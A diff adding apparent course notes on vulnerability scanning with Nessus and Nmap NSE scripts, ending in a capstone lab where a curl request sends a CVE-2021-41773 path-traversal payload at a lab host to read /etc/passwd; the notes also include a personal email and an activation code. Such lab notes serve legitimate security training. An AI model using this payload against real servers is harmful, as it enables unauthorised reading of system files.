@@ -1,0 +1,96 @@
+Vulnerability Scanning
+
+Vulnerability Scanning Theory
+
+Host discovery
+Port scanning
+Operating system, service, and version detection
+Matching the results to a vulnerability database
+
+CVE system, CVSS, false positive, false negative
+
+unauthenticated and authenticated vulnerability scans
+
+filtering, rate limiting, network traffic
+
+-----
+Vulnerability Scanning with Nessus
+
+apt list --installed nessus
+https://www.tenable.com/downloads/nessus
+
+cd ~/Downloads
+echo "d48278c2989dff0b8c86f71bc33084d645e310aef3612ed3f2cd3ad23e2e4bf6 Nessus-10.11.2-ubuntu1604_amd64.deb" > sha256sum_nessus
+sha256sum -c sha256sum_nessus
+Nessus-10.11.2-ubuntu1604_amd64.deb: OK
+
+sudo apt install ./Nessus-10.11.2-ubuntu1604_amd64.deb
+sudo systemctl start nessusd.service
+
+https://127.0.0.1:8834
+Nessus Essentials
+leefrk17@gmail.com
+Activation Code: 7QZU-8K4T-Q6MP-HFLR-XD38
+admin/ (activation failed !)
+
+discovery, compliance, vulnerability
+
+scan
+analyzing
+credentialed patch audit
+advanced dynamic scan
+
+-------
+Vulnerability Scanning with Nmap
+
+NSE scripts, safe and vuln, or intrusive and vuln
+ref: https://nmap.org/nsedoc/scripts/
+
+cd /usr/share/nmap/scripts/
+cat script.db  | grep "\"vuln\""
+
+ref: https://nmap.org/nsedoc/scripts/vulners.html
+categories safe, vuln, and external
+
+sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
+
+sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
+sudo nmap --script-updatedb
+sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
+
+------
+Capstone Labs: Follow the steps above to perform the vulnerability scan with the custom NSE script on VM #1. Copy the link from the script output after Verify arbitrary file read: and use it as a parameter for curl. This will retrieve the content of /etc/passwd of the target machine and display it. Be aware that you need to use http instead of https while keeping port 443 when you paste the link. Embed the last username of the file in the braces of "OS{}" and provide it as the answer to this exercise
+
+attacker 192.168.49.54
+target 192.168.54.13
+
+sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
+sudo nmap --script-updatedb
+sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.54.13
+
+Verify arbitrary file read: https://192.168.54.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+curl http://192.168.54.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
